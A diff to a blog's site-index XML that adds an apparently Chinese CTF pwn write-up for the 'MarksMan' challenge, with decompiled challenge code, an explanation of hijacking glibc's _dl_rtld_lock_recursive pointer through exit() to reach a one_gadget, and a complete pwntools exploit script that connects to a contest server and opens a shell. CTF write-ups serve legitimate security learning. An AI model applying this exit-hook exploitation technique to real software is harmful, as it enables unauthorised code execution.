@@ -4,6 +4,27 @@
   
     
     <entry>
+      <title>数字中国创新大赛虎符网络安全赛道pwn MarksMan writeup</title>
+      <link href="/2020/04/19/hfb-writeup/"/>
+      <url>/2020/04/19/hfb-writeup/</url>
+      
+        <content type="html"><![CDATA[<p>学习了通过修改<code>_dl_fini</code>中的一处函数指针来劫持程序流的利用方式</p><a id="more"></a><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>题目一开始给出了libc地址,并且允许任意地址写三字节。但是有<code>check()</code>函数会过滤掉三个<code>one_gadget</code>。</p><pre><code class="c">__int64 __fastcall main(__int64 a1, char **a2, char **a3){  signed int i; // [rsp+8h] [rbp-28h]  signed int j; // [rsp+Ch] [rbp-24h]  __int64 v6; // [rsp+10h] [rbp-20h]  char v7[3]; // [rsp+25h] [rbp-Bh]  unsigned __int64 v8; // [rsp+28h] [rbp-8h]  v8 = __readfsqword(0x28u);  setvbufs();  welcome();  puts(&quot;Free shooting games! Three bullets available!&quot;);  printf(&quot;I placed the target near: %p\n&quot;, &amp;puts);  puts(&quot;shoot!shoot!&quot;);  v6 = readl();  for ( i = 0; i &lt;= 2; ++i )  {    puts(&quot;biang!&quot;);    read(0, &amp;v7[i], 1uLL);    getchar();  }  if ( (unsigned int)check(v7) )  {    for ( j = 0; j &lt;= 2; ++j )      *(_BYTE *)(j + v6) = v7[j];  }  if ( !dlopen(0LL, 1) )                        // dlopen(NULL,RTLD_LAZY)    exit(1);  puts(&quot;bye~&quot;);  return 0LL;}signed __int64 __fastcall check(_BYTE *a1){  if ( (*a1 != 0xC5u || a1[1] != 0xF2u) &amp;&amp; (*a1 != 0x22 || a1[1] != 0xF3u) &amp;&amp; *a1 != 0x8Cu &amp;&amp; a1[1] != 0xA3u )    return 1LL;  puts(&quot;You always want a Gold Finger!&quot;);  return 0LL;}</code></pre><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>通过修改<code>_rtld_global</code>结构体中的<code>_dl_rtld_lock_recursive</code>指针的值为<code>one_gadget</code>来获取shell.<br>漏洞的原理是在调用<code>exit()</code>函数时有<code>exit()-&gt;__run_exit_handlers-&gt;_dl_fini-&gt;__rtld_lock_unlock_recursive</code>这样一条调用链，且<code>__rtld_lock_unlock_recursive</code>指针可读写，因此可以利用。<br>可以通过在gdb中<code>p &amp;_rtld_global._dl_rtld_lock_recursive</code>来获取偏移。</p><pre><code class="c">pwndbg&gt; p &amp;_rtld_global._dl_rtld_lock_recursive$2 = (void (**)(void *)) 0x7ffff7ffdf60 &lt;_rtld_global+3840&gt;</code></pre><p>在这题中,因为过滤掉了三个<code>one_gadget</code>,因此选择将<code>one_gadget</code>前移一条指令,即改为<code>0x10a387</code>,就可以成功get shell了。</p><pre><code class="bash">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)constraints:  rcx == NULL0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)constraints:  [rsp+0x40] == NULL0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints:  [rsp+0x70] == NULL</code></pre><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *context.log_level = &#39;DEBUG&#39;context.terminal = [&#39;tmux&#39;, &#39;sp&#39;, &#39;-h&#39;]#sh = process(&quot;./chall&quot;, env = {&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;})#  sh = process(&#39;./chall&#39;)sh = remote(&#39;39.97.210.182&#39;, 10055)sh.recvuntil(&#39;near: &#39;)libc_base = int(sh.recvuntil(&#39;\n&#39;)[:-1],16) - 0x809c0log.info(&quot;libc_base = &quot;+hex(libc_base))one_gadget = libc_base + 0x10a387dl_rtld_lock_recursive = libc_base + 0x81DF60log.info(&quot;target = &quot; + hex(dl_rtld_lock_recursive))log.info(&#39;one_gadget = &#39;+hex(one_gadget))#gdb.attach(sh)sh.recvuntil(&#39;shoot!shoot!\n&#39;)sh.sendline(str(dl_rtld_lock_recursive))sh.recvuntil(&#39;biang!\n&#39;)sleep(0.1)sh.sendline(p8(one_gadget &amp; 0xFF))sh.recvuntil(&#39;biang!\n&#39;)sleep(0.1)sh.sendline(p8((one_gadget &gt;&gt; 8) &amp; 0xFF))sh.recvuntil(&#39;biang!\n&#39;)sleep(0.1)sh.sendline(p8((one_gadget &gt;&gt; 16) &amp; 0xFF))sh.interactive()</code></pre><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><blockquote><p><a href="http://www.starssgo.top/2020/04/13/exit-hook%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">http://www.starssgo.top/2020/04/13/exit-hook%E6%94%BB%E5%87%BB/</a></p></blockquote>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> ctf </tag>
+            
+            <tag> pwn </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>IO_FILE Related</title>
       <link href="/2020/04/07/io_file_Related/"/>
       <url>/2020/04/07/io_file_Related/</url>
